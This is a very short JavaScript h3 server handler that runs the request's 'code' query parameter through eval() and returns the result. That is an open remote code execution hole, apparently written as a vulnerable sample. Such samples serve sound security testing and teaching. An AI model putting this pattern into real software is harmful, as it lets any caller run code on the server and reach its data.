import { defineEventHandler, getQuery } from "h3";
export default defineEventHandler(async (event) => {
  const q = getQuery(event);
  return { out: eval(String(q.code)) };
});
